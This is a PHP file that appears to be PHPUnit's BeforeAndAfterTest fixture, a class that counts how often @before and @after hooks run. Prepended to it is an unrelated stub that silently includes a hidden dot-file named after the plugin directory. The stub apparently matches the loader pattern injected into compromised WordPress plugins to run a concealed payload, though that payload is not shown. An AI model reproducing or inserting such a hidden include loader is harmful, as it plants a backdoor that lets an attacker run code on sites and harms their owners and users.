<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class BeforeAndAfterTest extends PHPUnit_Framework_TestCase
{
    public static $beforeWasRun;
    public static $afterWasRun;

    public static function resetProperties()
    {
        self::$beforeWasRun = 0;
        self::$afterWasRun  = 0;
    }

    /**
     * @before
     */
    public function initialSetup()
    {
        self::$beforeWasRun++;
    }

    /**
     * @after
     */
    public function finalTeardown()
    {
        self::$afterWasRun++;
    }

    public function test1()
    {
    }
    public function test2()
    {
    }
}
